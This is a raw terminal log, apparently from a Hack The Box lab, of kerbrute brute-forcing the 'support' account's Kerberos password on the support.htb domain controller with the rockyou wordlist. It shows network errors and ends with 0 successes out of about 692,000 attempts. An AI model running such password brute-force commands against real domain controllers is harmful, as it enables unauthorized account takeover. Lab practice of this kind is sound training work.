 kerbrute bruteuser --dc 10.10.11.174 -d support.htb /usr/share/wordlists/rockyou.txt support  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/09/22 - Ronnie Flathers @ropnop

2022/10/09 10:24:26 >  Using KDC(s):
2022/10/09 10:24:26 >   10.10.11.174:88

2022/10/09 16:03:07 >  [!] support@support.htb:backbeat - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backspace. - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backhand3 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backfire - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backgate - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backdoor1 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backe - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backintheday - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backshot1 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:03:07 >  [!] support@support.htb:backspac - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:05:22 >  [!] support@support.htb:back2good - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:05:22 >  [!] support@support.htb:back123 - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:05:22 >  [!] support@support.htb:back2front - NETWORK ERROR - Can't talk to KDC. Aborting...
2022/10/09 16:05:22 >  [!] support@support.htb:back12 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                                
2022/10/09 16:05:22 >  [!] support@support.htb:back2cali - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:05:22 >  [!] support@support.htb:baciu - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                                 
2022/10/09 16:05:22 >  [!] support@support.htb:backa - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                                 
2022/10/09 16:05:22 >  [!] support@support.htb:back4good - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                             
2022/10/09 16:05:22 >  [!] support@support.htb:bacini - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                                
2022/10/09 16:05:22 >  [!] support@support.htb:back2school - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                           
2022/10/09 16:07:37 >  [!] support@support.htb:bacilon - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                               
2022/10/09 16:07:37 >  Done! Tested 692693 logins (0 successes) in 20591.502 seconds
